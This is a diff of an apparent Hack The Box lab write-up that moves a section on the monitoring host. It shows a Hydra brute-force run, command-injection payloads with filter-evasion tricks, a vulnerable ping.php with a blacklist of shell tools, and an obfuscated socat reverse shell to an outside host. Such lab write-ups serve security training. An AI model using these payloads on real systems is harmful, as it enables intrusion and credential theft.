@@ -356,160 +356,20 @@ discovered new vhost shopdev2.inlanefreight.local and the flag:
 
 HTB{32596e8376077c3ef8d5cf52f15279ba}
 
-## monitoring.inlanefreight.local
 
-Another login:
-
-![](./vhosts/monitoring/monitoring0.png)
-
-bruteforcing reveals creds:
-
-```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
-Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:58
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=^USER^&password=^PASS^:F=Invalid
-[STATUS] 2370.00 tries/min, 2370 tries in 00:01h, 14342029 to do in 100:52h, 16 active
-[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
-                                                                                 
-```
-
-The shell accessible is very limited:
-
-![](./vhosts/monitoring/monitoring1.png)
-
-
-Enumerating source code:
-
-![](./vhosts/monitoring/monitoring2.png)
-
-looking into main.js an interesting endpoint is disclosed, which executes a ping command on the underlying server, possibly vulnerable to a command injection:
-
-
-![](./vhosts/monitoring/monitoring3.png)
-
-testing the endpoint:
-
-![](./vhosts/monitoring/monitoring4.png)
-
-command injection works, %0a is \n url endcoded and its not blacklisted:
-
-```
-/ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
-```
-
-![](./vhosts/monitoring/monitoring5.png)
-
-reading ping.php:
-
-```
-GET /ping.php?ip=127.0.0.1%0acat${IFS}ping.php
-```
-
-![](./vhosts/monitoring/monitoring6.png)
-
-(keep whole file,explain):
-
-```php
-<?php
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-$output = '';
-
-function filter($str)
-{
-  $operators = ['&', '|', ';', '\\', '/', ' '];
-  foreach ($operators as $operator) {
-    if (strpos($str, $operator)) {
-      return true;
-    }
-  }
-  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
-  foreach ($words as $word) {
-    if (strpos($str, $word) !== false) {
-      return true;
-    }
-  }
-
-  return false;
-}
-
-if (isset($_GET['ip'])) {
-  $ip = $_GET['ip'];
-  if (filter($ip)) {
-    $output = "Invalid input";
-  } else {
-    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
-    $output = shell_exec($cmd);
-  }
-}
-?>
-<?php
-echo $output;
-?>
-
-```
-
-socat is not blacklisted:
-
-![](./vhosts/monitoring/monitoring7.png)
-
-
-a socat reverse shell is then used and adapted to evade the filters:
-
-```
-socat TCP:10.10.14.111:9001 EXEC:bash
-```
-
-```
-GET /ping.php?ip=127.0.0.1%0aso'c'at${IFS}TCP:10.10.14.111:9001${IFS}EXEC:bash
-```
-
-
-![](./vhosts/monitoring/monitoring8.png)
-
-a shell as webdev is achieved on dmz01:
-
-```
-nc -lvnp 9001 
-listening on [any] 9001 ...
-connect to [10.10.14.111] from (UNKNOWN) [10.129.41.126] 57022
-id
-uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-webdev@dmz01:/var/www/html/monitoring$ ^Z
-zsh: suspended  nc -lvnp 9001
-                                                                                                                
-┌──(kali㉿kali)-[~/labs/aen/xss]
-└─$ stty raw -echo; fg  
-[1]  + continued  nc -lvnp 9001
-
-webdev@dmz01:/var/www/html/monitoring$ find / -name "flag.txt" 2>/dev/null
-/home/srvadm/flag.txt
-/srv/ftp/flag.txt
-webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt            
-b447c27a00e3a348881b0030177000cd
-webdev@dmz01:/var/www/html/monitoring$ cat /srv/ftp/flag.txt
-HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
-webdev@dmz01:/var/www/html/monitoring$ 
-```
-
-This shell will be used later for local privilege escalation and pivoting to internal networks.
 ## ir.inlanefreight.local
 
-img1
+![](./vhosts/ir/ir1.png)
+
+by exploring and curling the page its possible to see that its based on wordpress:
 
 ```
 curl -s http://ir.inlanefreight.local | grep WordPress 
 <meta name="generator" content="WordPress 6.0" />
 
 ```
+
+enumeration the application with wpscan reveals users and especially the vulnerable mail masta plugin, which has a LFI vulnerability:
 
 ```
  wpscan --url http://ir.inlanefreight.local --enumerate
@@ -803,8 +663,151 @@ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 HTB{e7134abea7438e937b87608eab0d979c}
 ```
 
+## monitoring.inlanefreight.local
+
+Another login:
+
+![](./vhosts/monitoring/monitoring0.png)
+
+bruteforcing reveals creds:
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:58
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=^USER^&password=^PASS^:F=Invalid
+[STATUS] 2370.00 tries/min, 2370 tries in 00:01h, 14342029 to do in 100:52h, 16 active
+[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
+                                                                                 
+```
+
+The shell accessible is very limited:
+
+![](./vhosts/monitoring/monitoring1.png)
 
 
+Enumerating source code:
+
+![](./vhosts/monitoring/monitoring2.png)
+
+looking into main.js an interesting endpoint is disclosed, which executes a ping command on the underlying server, possibly vulnerable to a command injection:
+
+
+![](./vhosts/monitoring/monitoring3.png)
+
+testing the endpoint:
+
+![](./vhosts/monitoring/monitoring4.png)
+
+command injection works, %0a is \n url endcoded and its not blacklisted:
+
+```
+/ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+![](./vhosts/monitoring/monitoring5.png)
+
+reading ping.php:
+
+```
+GET /ping.php?ip=127.0.0.1%0acat${IFS}ping.php
+```
+
+![](./vhosts/monitoring/monitoring6.png)
+
+(keep whole file,explain):
+
+```php
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+$output = '';
+
+function filter($str)
+{
+  $operators = ['&', '|', ';', '\\', '/', ' '];
+  foreach ($operators as $operator) {
+    if (strpos($str, $operator)) {
+      return true;
+    }
+  }
+  $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
+  foreach ($words as $word) {
+    if (strpos($str, $word) !== false) {
+      return true;
+    }
+  }
+
+  return false;
+}
+
+if (isset($_GET['ip'])) {
+  $ip = $_GET['ip'];
+  if (filter($ip)) {
+    $output = "Invalid input";
+  } else {
+    $cmd = "bash -c 'ping -c 1 " . $ip . "'";
+    $output = shell_exec($cmd);
+  }
+}
+?>
+<?php
+echo $output;
+?>
+
+```
+
+socat is not blacklisted:
+
+![](./vhosts/monitoring/monitoring7.png)
+
+
+a socat reverse shell is then used and adapted to evade the filters:
+
+```
+socat TCP:10.10.14.111:9001 EXEC:bash
+```
+
+```
+GET /ping.php?ip=127.0.0.1%0aso'c'at${IFS}TCP:10.10.14.111:9001${IFS}EXEC:bash
+```
+
+
+![](./vhosts/monitoring/monitoring8.png)
+
+a shell as webdev is achieved on dmz01:
+
+```
+nc -lvnp 9001 
+listening on [any] 9001 ...
+connect to [10.10.14.111] from (UNKNOWN) [10.129.41.126] 57022
+id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+webdev@dmz01:/var/www/html/monitoring$ ^Z
+zsh: suspended  nc -lvnp 9001
+                                                                                                                
+┌──(kali㉿kali)-[~/labs/aen/xss]
+└─$ stty raw -echo; fg  
+[1]  + continued  nc -lvnp 9001
+
+webdev@dmz01:/var/www/html/monitoring$ find / -name "flag.txt" 2>/dev/null
+/home/srvadm/flag.txt
+/srv/ftp/flag.txt
+webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt            
+b447c27a00e3a348881b0030177000cd
+webdev@dmz01:/var/www/html/monitoring$ cat /srv/ftp/flag.txt
+HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
+webdev@dmz01:/var/www/html/monitoring$ 
+```
+
+This shell will be used later for local privilege escalation and pivoting to internal networks.
 
 
 ## shopdev2.inlanefreight.local
